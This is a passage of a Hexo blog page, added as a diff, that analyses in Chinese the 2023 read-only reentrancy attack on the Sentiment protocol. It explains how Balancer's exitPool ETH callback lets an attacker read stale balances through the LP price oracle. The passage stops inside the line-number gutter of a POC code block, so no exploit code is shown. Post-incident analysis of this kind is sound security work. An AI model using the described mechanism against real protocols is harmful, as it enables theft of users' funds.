@@ -1,0 +1,1275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Chiu">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/05/27/sentiment_ro_reentrancy/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="概述2023年4月4日，Sentiment协议遭受攻击，root cause为 Balancer 池在移除流动性时可以指定返回ETH，并且内部余额更新晚于ETH转账底层call调用，即使移除流动性函数本身有重入锁，但仍可跨函数利用。 漏洞背景Sentiment是一个DeFi借贷协议，使用Balancer LP代币作为抵押品。计算帐号健康因子时，协议依赖WeightedBalancerLPOracl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sentiment协议只读重入攻击分析">
+<meta property="og:url" content="http://example.com/2025/05/27/Sentiment_RO_Reentrancy/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="概述2023年4月4日，Sentiment协议遭受攻击，root cause为 Balancer 池在移除流动性时可以指定返回ETH，并且内部余额更新晚于ETH转账底层call调用，即使移除流动性函数本身有重入锁，但仍可跨函数利用。 漏洞背景Sentiment是一个DeFi借贷协议，使用Balancer LP代币作为抵押品。计算帐号健康因子时，协议依赖WeightedBalancerLPOracl">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-1301216421.cos.ap-chengdu.myqcloud.com/Sentiment%2520RO%2520Reentrancy%2520(1).png">
+<meta property="article:published_time" content="2025-05-27T02:36:41.000Z">
+<meta property="article:modified_time" content="2025-07-14T13:32:17.731Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="区块链">
+<meta property="article:tag" content="DeFi">
+<meta property="article:tag" content="攻击事件分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1301216421.cos.ap-chengdu.myqcloud.com/Sentiment%2520RO%2520Reentrancy%2520(1).png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Sentiment协议只读重入攻击分析 | Chiu&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+        
+<script src="/js/build/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Input | Think | Output","subtitle":{"text":["How you spend every day is how you spend your life"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Idealist17","instagram":null,"zhihu":null,"twitter":null,"email":"ChiuFangxi@gmail.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.4","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Gallery":{"icon":"fa-solid fa-image","path":"/masonry/"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Friends":"/friends"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"Input | Think | Output","show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/7/30 14:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":true};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        Chiu&#39;s Blog
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({ loop: true })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [20, 0],
+                translateZ: 0,
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
+                easing: "easeOutExpo",
+                duration: 1200,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
+                complete: function() {
+                    hidePreloader();
+                }
+            }, '-=700');
+
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Chiu&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/masonry/"
+                                        >
+                                    <i class="fa-solid fa-image fa-fw"></i>
+                                    GALLERY
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/friends">
+                                                    FRIENDS
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/masonry/"
+                        >
+                            <span>
+                                GALLERY
+                            </span>
+                            
+                                <i class="fa-solid fa-image fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/friends">FRIENDS</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>Tags</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">22</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">35</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Sentiment协议只读重入攻击分析</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/redefine-avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Chiu</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-05-27 10:36:41</span>
+        <span class="mobile">2025-05-27 10:36:41</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-07-14 21:32:17</span>
+            <span class="mobile">2025-07-14 21:32:17</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/DeFi/">DeFi</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/">攻击事件分析</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>2023年4月4日，Sentiment协议遭受攻击，root cause为 Balancer 池在移除流动性时可以指定返回ETH，并且内部余额更新晚于ETH转账底层call调用，即使移除流动性函数本身有重入锁，但仍可跨函数利用。</p>
+<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>Sentiment是一个DeFi借贷协议，使用Balancer LP代币作为抵押品。计算帐号健康因子时，协议依赖<code>WeightedBalancerLPOracle</code>来获取LP代币的价格，而这个预言机在只读重入攻击下读取了过时的balance，计算出的是错误的LP token价格。</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="根本原因"><a href="#根本原因" class="headerlink" title="根本原因"></a>根本原因</h3><p>漏洞的根本原因在于Balancer池在处理ETH提取时的设计缺陷：</p>
+<ol>
+<li><strong>非Check-Effect-Interact模式操作</strong>：Balancer在<code>exitPool</code>操作中，先销毁LP代币、转移资金，最后才更新内部余额状态</li>
+<li><strong>ETH转账的重入风险</strong>：当返回代币包含ETH时，Balancer使用低级<code>call()</code>转账，允许接收方控制执行流</li>
+<li><strong>view函数无保护</strong>：预言机<code>getPrice()</code>是view函数，无法使用重入锁保护（锁需要写入变量，view无法写入）</li>
+</ol>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-1301216421.cos.ap-chengdu.myqcloud.com/Sentiment%2520RO%2520Reentrancy%2520(1).png"
+                      alt="POC攻击流"
+                ><br><a class="link"   target="_blank" rel="noopener" href="https://boardmix.cn/app/share/CAE.CIuKxA4gASoQHyUJ6piWD3iVu8YCKpGdkjAGQAE/BVfAge" >白板图链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span 